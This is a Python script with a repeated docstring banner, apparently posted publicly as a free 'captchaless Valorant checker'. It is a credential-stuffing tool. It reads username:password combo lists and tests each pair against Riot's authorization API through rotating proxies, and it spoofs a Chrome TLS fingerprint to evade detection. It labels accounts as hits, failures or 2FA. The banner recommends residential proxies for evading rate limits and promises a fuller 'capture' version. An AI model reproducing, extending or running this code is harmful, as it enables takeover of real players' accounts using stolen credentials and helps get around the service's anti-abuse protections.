"""
## I've another version with full capture and optimized+functions

## which will be posted as soon as this post reaches 20 stars.
___
# VALORANT CHECKER WORKING CAPTCHALESS
___
This checker is a **free version** that only performs combo authentication on Riot (Valorant/League).

**This free version will not receive upgrades**.

**I will not provide support**.
___
## Important Notes:
**Do not ask dumb questions, just read below:**
- In `combo.txt` use the format:
  `user:pass`

- Proxy format:
  `user:pass@host:port` or `host:port`

- If you need to change the delays, do so wisely.
___
## Recommendation:
Use **high-quality rotating residential proxies**.
If you're getting too many errors, your proxy is probably bad.
___
"""

import time
import tls_client
import random

from tls_client.exceptions import TLSClientExeption
from modules.utils import lc, b, bb, lp


def auth():
    list_combo = lc()
    for combo in list_combo:
        try:
            s = r()
            bd = b()
            p = lp()
            ps = random.choice(p)
            h = {"Content-Type": "application/json", "Host": "auth.riotgames.com"}
            url = "https://auth.riotgames.com/api/v1/authorization"

            blocked = 1

            r1 = s.post(
                url=url,
                headers=h,
                json=bd,
                proxy=f"http://{ps}",
            )

            if r1.status_code == 200:
                username, password = combo.split(":")
                bbd = bb(username, password)
                nh = {
                    "Content-Type": "application/json",
                    "referer": f"https://ppk.riotgames.com/",
                }

                r2 = s.put(
                    url=url,
                    headers=nh,
                    json=bbd,
                    proxy=f"http://{ps}",
                )

                if r2.status_code == 200:
                    r2_data = r2.json()
                    v(r2_data, combo)
                elif r2.status_code == 429:
                    print(f"RATELIMIT       {combo}")
                    time.sleep(blocked)
                elif r2.status_code == 498:
                    print(f"RIOT BLOCK U    {combo}")
                    time.sleep(blocked)
                else:
                    print(f"r2: {r2.status_code}\n{r2.text}")
                    time.sleep(blocked)
            else:
                print(f"RATELIMIT")
                time.sleep(blocked)
        except TLSClientExeption:
            print(f"request error")
        except Exception as e:
            print(f"Error: {e}")
    print("ALL CHECKED, DONE.")


def v(r2_data, combo):
    waiting = 1
    if r2_data:
        param_response = r2_data.get("response")
        if param_response:
            print(f"HIT        {combo}")
            time.sleep(waiting)
        elif "error" in r2_data and r2_data["error"] == "auth_failure":
            print(f"BAD        {combo}")
            time.sleep(waiting)
        else:
            print(f"2FA        {combo} -> {r2_data}")
            time.sleep(waiting)


def r():
    s = tls_client.Session(
        client_identifier="chrome_120", random_tls_extension_order=True
    )
    return s
"""
## I've another version with full capture and optimized+functions

## which will be posted as soon as this post reaches 20 stars. 
___
# VALORANT CHECKER WORKING CAPTCHALESS
___
This checker is a **free version** that only performs combo authentication on Riot (Valorant/League).

**This free version will not receive upgrades**.

**I will not provide support**.
___
## Important Notes:
**Do not ask dumb questions, just read below:**
- In `combo.txt` use the format:
  `user:pass`

- Proxy format:
  `user:pass@host:port` or `host:port`

- If you need to change the delays, do so wisely.
___
## Recommendation:
Use **high-quality rotating residential proxies**.  
If you're getting too many errors, your proxy is probably bad.
___
"""